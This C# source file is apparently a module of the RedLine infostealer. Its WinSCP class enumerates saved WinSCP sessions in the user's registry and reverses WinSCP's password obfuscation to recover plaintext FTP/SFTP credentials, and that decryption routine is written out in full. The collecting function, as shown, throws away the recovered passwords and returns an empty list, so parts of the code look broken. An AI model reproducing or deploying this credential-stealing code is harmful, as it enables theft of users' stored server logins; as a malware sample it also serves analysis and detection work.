using Microsoft.Win32;
using RedLine.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace RedLine.Logic.FtpClients
{
	public static class WinSCP
	{
		public static List<LoginPair> ParseConnections()
		{
			List<LoginPair> result = new List<LoginPair>();
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Sessions"))
				{
					if (registryKey == null)
					{
						return result;
					}
					string[] subKeyNames = registryKey.GetSubKeyNames();
					foreach (string path in subKeyNames)
					{
						string name = Path.Combine("Software\\Martin Prikryl\\WinSCP 2\\Sessions", path);
						using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name))
						{
							if (registryKey2 != null)
							{
								string text = registryKey2.GetValue("HostName")?.ToString();
								if (!string.IsNullOrWhiteSpace(text))
								{
									DecryptPassword(registryKey2.GetValue("UserName")?.ToString(), registryKey2.GetValue("Password")?.ToString(), text);
									text = text + ":" + registryKey2.GetValue("PortNumber");
								}
							}
						}
					}
					return result;
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				return result;
			}
		}

		private static int DecodeNextChar(List<string> list)
		{
			return 0xFF ^ ((((int.Parse(list[0]) << 4) + int.Parse(list[1])) ^ 0xA3) & 0xFF);
		}

		private static string DecryptPassword(string user, string pass, string host)
		{
			try
			{
				if (user == string.Empty || pass == string.Empty || host == string.Empty)
				{
					return "";
				}
				List<string> list = pass.Select((char keyf) => keyf.ToString()).ToList();
				List<string> list2 = new List<string>();
				for (int i = 0; i < list.Count; i++)
				{
					if (list[i] == "A")
					{
						list2.Add("10");
					}
					if (list[i] == "B")
					{
						list2.Add("11");
					}
					if (list[i] == "C")
					{
						list2.Add("12");
					}
					if (list[i] == "D")
					{
						list2.Add("13");
					}
					if (list[i] == "E")
					{
						list2.Add("14");
					}
					if (list[i] == "F")
					{
						list2.Add("15");
					}
					if ("ABCDEF".IndexOf(list[i]) == -1)
					{
						list2.Add(list[i]);
					}
				}
				List<string> list3 = list2;
				int num = 0;
				if (DecodeNextChar(list3) == 255)
				{
					num = DecodeNextChar(list3);
				}
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				num = DecodeNextChar(list3);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				int num2 = DecodeNextChar(list3) * 2;
				for (int j = 0; j < num2; j++)
				{
					list3.Remove(list3[0]);
				}
				string text = "";
				for (int k = -1; k < num; k++)
				{
					string str = ((char)DecodeNextChar(list3)).ToString();
					list3.Remove(list3[0]);
					list3.Remove(list3[0]);
					text += str;
				}
				string text2 = user + host;
				int count = text.IndexOf(text2, StringComparison.Ordinal);
				text = text.Remove(0, count);
				return text.Replace(text2, "");
			}
			catch
			{
				return "";
			}
		}
	}
}
